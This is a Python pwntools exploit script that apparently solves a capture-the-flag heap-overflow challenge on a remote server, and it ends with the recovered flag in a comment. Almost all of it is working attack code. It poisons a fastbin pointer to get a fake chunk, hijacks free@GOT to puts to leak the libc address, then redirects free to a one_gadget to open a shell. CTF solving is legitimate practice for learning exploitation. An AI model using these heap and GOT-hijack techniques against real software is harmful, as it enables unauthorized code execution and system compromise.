#!/usr/bin/env python
from pwn import *

#r = remote('127.0.0.1', 4000)
r = remote('35.201.132.60', 50216)
libc = ELF('libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

def create(size, content):
    r.sendlineafter('Your choice :', '1')
    r.sendlineafter('Size of Heap : ', str(size))
    r.sendafter('Content of heap:', content)

def edit(idx, size, content):
    r.sendlineafter('Your choice :', '2')
    r.sendlineafter('Index :', str(idx))
    r.sendlineafter('Size of Heap : ', str(size))
    r.sendlineafter('Content of heap : ', content)

def delete(idx):
    r.sendlineafter('Your choice :', '3')
    r.sendlineafter('Index :', str(idx))

name_buf = 0x6020a0
free_got = 0x602018
puts_plt = 0x4006b0
malloc_got = 0x602050

r.sendafter('Name:', p64(free_got)+p64(malloc_got)+p64(0x21))

# overwrite fd of fastchunk to fake chunk on name_buf
create(0x30-8, 'A'*8) # 0
create(0x20-8, 'B'*8) # 1
delete(1)
edit(0, 0x100, 'A'*0x20 + p64(0) + p64(0x21) + p64(name_buf+8))

# get fake chunk, GOT hijack free() -> puts()
create(0x20-8, 'C'*8) # 1
create(0x20-8, p64(name_buf)) # 2
edit(0, 0x100, p64(puts_plt))

# free(pointer_pool[1]) -> puts(malloc_got)
# leak libc address
delete(1)
libc_base = u64(r.recvline()[:-1].ljust(8, '\x00')) - libc.symbols['malloc']
log.success('libc base: ' + hex(libc_base))
one_gadget = libc_base + 0xf0274 # constraint: [rsp+0x50] == NULL

# GOT hijack free() -> one gadget
edit(0, 0x100, p64(one_gadget))
delete(0)

r.interactive()

# FLAG{h34p_0verfl0w_is_e4ay_for_u}
